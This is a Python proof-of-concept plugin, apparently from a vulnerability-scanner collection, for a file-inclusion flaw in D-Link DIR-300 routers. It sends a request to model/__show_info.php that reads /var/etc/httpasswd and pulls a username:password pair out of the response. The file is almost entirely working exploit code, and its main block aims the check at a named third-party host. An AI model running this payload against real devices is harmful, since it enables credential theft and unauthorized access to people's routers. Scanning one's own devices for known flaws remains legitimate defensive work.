#!/usr/bin/env python
# -*- coding: utf-8 -*-
import urlparse
import time
import re

"""
POC Name  :  D-Link DIR-300 文件包含漏洞
Author    :  a
mail      :  a@lcx.cc
Referer   :  http://www.wooyun.org/bugs/wooyun-2010-066799
"""

from ..miniCurl import Curl
from ..t  import T

class P(T):
    def __init__(self):
        T.__init__(self)
    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackinfo=''):
        arg='http://'+ip+':'+port+'/'
        curl=Curl()
        result = {}
        result['result']=False

        
        payload = 'model/__show_info.php?REQUIRE_FILE=/var/etc/httpasswd'
        url = arg + payload
        code, head,res, errcode, _ = curl.curl2(url)
        start =  res.find('Main Content Start ')
        end = res.find('Main Content End')
        if res.find(':',start,end) != -1 and code == 200:
            m = re.search(r"(\w+):(\w+)", res)
            if m:
                output('/var/etc/httpasswd:' + m.group(0),result,'hole')
    
    
    
    
    

        del curl
        return result


def output(url,result,label):
    info = url + '  d-link  Vul '
    result['result']=True
    result['VerifyInfo'] = {}
    result['VerifyInfo']['type']='d-link Vul'
    result['VerifyInfo']['URL'] =url
    result['VerifyInfo']['payload']='/root/github/poccreate/thirdparty/d-link/d-link_a7eba98a02fcad47d24f862457b9cc43.py'
    result['VerifyInfo']['level']=label
    result['VerifyInfo']['result'] =info

if __name__ == '__main__':
    print P().verify(ip='http://yunlai.cn:803/sfdsfds/',port='80')

#/root/github/poccreate/thirdparty/d-link/d-link_a7eba98a02fcad47d24f862457b9cc43.py
#/root/github/poccreate/codesrc/exp-1921.py